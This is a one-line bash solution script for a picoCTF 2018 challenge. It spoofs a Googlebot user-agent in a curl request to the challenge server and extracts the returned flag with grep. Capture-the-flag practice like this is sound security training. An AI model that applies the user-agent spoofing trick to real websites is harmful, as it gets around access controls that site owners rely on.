#!/bin/bash
curl -s --user-agent 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' 'http://2018shell.picoctf.com:3827/flag' | grep -oE 'picoCTF{.*}' --color=none
